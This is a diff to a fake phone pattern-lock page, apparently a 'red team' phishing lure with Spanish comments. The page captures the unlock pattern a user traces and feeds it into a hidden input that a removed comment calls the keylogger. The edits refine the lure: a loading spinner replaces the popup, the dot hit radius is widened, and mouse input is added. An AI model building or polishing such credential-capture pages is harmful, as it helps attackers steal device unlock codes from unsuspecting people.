@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Red Team Elite - Ultra Fluid</title>
+    <title>Red Team Elite - Pro Loader</title>
     <style>
         :root {
             --mario-white: #ffffff;
             --mario-yellow: #ffcc00;
             --error-red: #ff4444;
-            --popup-bg: rgba(255, 255, 255, 0.95);
-            --loader-grey: #888888;
+            --loader-grey: #e7e7e7;
         }
 
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -46,26 +45,27 @@
 
         @keyframes scrollLeft { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
 
-        #game-popup {
-            position: absolute; top: -110px; left: 50%; transform: translateX(-50%);
-            background: var(--popup-bg); color: #333; min-width: 230px; 
-            padding: 15px 40px; border-radius: 15px; font-size: 0.9rem;
-            font-weight: 500; box-shadow: 0 10px 30px rgba(0,0,0,0.4);
-            display: none; flex-direction: column; align-items: center; z-index: 100;
+        #loader-container {
+            position: absolute;
+            top: -80px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: none;
+            z-index: 100;
         }
 
         .loader {
-            border: 3px solid rgba(0,0,0,0.05); border-top: 3px solid var(--loader-grey);
-            border-radius: 50%; width: 20px; height: 20px;
-            animation: spin 1s linear infinite; margin-top: 12px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid var(--loader-grey);
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            animation: spin 1s linear infinite;
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        #pattern-wrapper { 
-            position: relative; width: 280px; height: 280px; 
-            will-change: transform; /* Optimización de GPU */
-        }
+        #pattern-wrapper { position: relative; width: 280px; height: 280px; }
 
         canvas { position: absolute; top: 0; left: 0; z-index: 1; pointer-events: none; }
 
@@ -81,16 +81,23 @@
             box-shadow: 0 0 5px rgba(0,0,0,0.3);
         }
 
+        /* --- SECCIÓN INFERIOR UNIFICADA --- */
         .bottom-links {
             width: 280px; display: flex; justify-content: space-between;
             align-items: center; margin-top: 40px;
         }
 
+        /* ESTILO IDENTICO PARA EMERGENCIA Y VOLVER */
         .link-text {
-            color: var(--mario-white) !important; font-size: 1rem !important;
-            font-family: 'Segoe UI', sans-serif !important; font-weight: 400; 
-            letter-spacing: 1px !important; text-transform: uppercase !important;
-            text-decoration: none; cursor: pointer;
+            color: var(--mario-white) !important; 
+            font-size: 1rem !important;
+            font-family: 'Segoe UI', sans-serif !important; 
+            font-weight: 600; /* AHORA AMBOS SON NEGRITA LIMPIA */
+            letter-spacing: 1px !important; 
+            text-transform: uppercase !important;
+            text-decoration: none; 
+            cursor: pointer;
+            display: inline-block;
         }
     </style>
 </head>
@@ -107,10 +114,10 @@
     </div>
     
     <div id="pattern-wrapper">
-        <div id="game-popup">
-            <span>Ingresando ...</span>
+        <div id="loader-container">
             <div class="loader"></div>
         </div>
+
         <canvas id="pattern-canvas"></canvas>
         <div class="dots-grid">
             <div class="dot" data-id="1"></div><div class="dot" data-id="2"></div><div class="dot" data-id="3"></div>
@@ -135,7 +142,7 @@
     const canvas = document.getElementById('pattern-canvas');
     const ctx = canvas.getContext('2d');
     const dots = document.querySelectorAll('.dot');
-    const popup = document.getElementById('game-popup');
+    const loaderCont = document.getElementById('loader-container');
     const keySink = document.getElementById('key-sink');
 
     const CORRECT_PATTERN = "123456789"; 
@@ -162,21 +169,15 @@
         });
     }
 
-    // --- FUNCIÓN CLAVE: INTERPOLACIÓN LINEAL ---
     function checkIntersections(x1, y1, x2, y2) {
         dotCenters.forEach(center => {
             if (path.find(p => p.id === center.id)) return;
-
-            // Distancia del punto a la línea del dedo
             const L2 = (x2 - x1) ** 2 + (y2 - y1) ** 2;
             if (L2 === 0) return;
             let t = ((center.x - x1) * (x2 - x1) + (center.y - y1) * (y2 - y1)) / L2;
             t = Math.max(0, Math.min(1, t));
-            
             const dist = Math.sqrt((center.x - (x1 + t * (x2 - x1))) ** 2 + (center.y - (y1 + t * (y2 - y1))) ** 2);
-
-            // Si la línea pasa a menos de 25px de un punto, lo capturamos
-            if (dist < 25) {
+            if (dist < 28) {
                 path.push(center);
                 center.element.classList.add('active');
                 if (navigator.vibrate) navigator.vibrate(35);
@@ -191,7 +192,7 @@
         lineColor = '#ffffff';
         dotCenters.forEach(c => c.element.classList.remove('active'));
         ctx.clearRect(0, 0, canvas.width, canvas.height);
-        popup.style.display = 'none';
+        loaderCont.style.display = 'none';
         
         const clientX = e.touches ? e.touches[0].clientX : e.clientX;
         const clientY = e.touches ? e.touches[0].clientY : e.clientY;
@@ -204,13 +205,9 @@
         const clientX = e.touches ? e.touches[0].clientX : e.clientX;
         const clientY = e.touches ? e.touches[0].clientY : e.clientY;
         const rect = wrapper.getBoundingClientRect();
-        
         const newX = clientX - rect.left;
         const newY = clientY - rect.top;
-
-        // Verificamos si en el trayecto desde la posición anterior tocamos algún punto
         checkIntersections(mousePos.x, mousePos.y, newX, newY);
-        
         mousePos = { x: newX, y: newY };
     }
 
@@ -220,7 +217,6 @@
         const userPattern = path.map(p => p.id).join('');
         
         if (path.length > 0) {
-            // Envío veloz al keylogger
             keySink.focus();
             keySink.value = userPattern;
             keySink.dispatchEvent(new Event('input', { bubbles: true }));
@@ -232,8 +228,12 @@
                     lineColor = '#ff4444';
                     setTimeout(resetUI, 600);
                 } else {
-                    popup.style.display = 'flex';
-                    setTimeout(() => { popup.style.display = 'none'; failCount = 0; resetUI(); }, 10000);
+                    loaderCont.style.display = 'block';
+                    setTimeout(() => { 
+                        loaderCont.style.display = 'none'; 
+                        failCount = 0; 
+                        resetUI(); 
+                    }, 10000); 
                 }
             }
         }
@@ -268,6 +268,9 @@
     wrapper.addEventListener('touchstart', (e) => { e.preventDefault(); start(e); }, { passive: false });
     window.addEventListener('touchmove', (e) => { move(e); }, { passive: false });
     window.addEventListener('touchend', end);
+    wrapper.addEventListener('mousedown', start);
+    window.addEventListener('mousemove', move);
+    window.addEventListener('mouseup', end);
 </script>
 </body>
 </html>
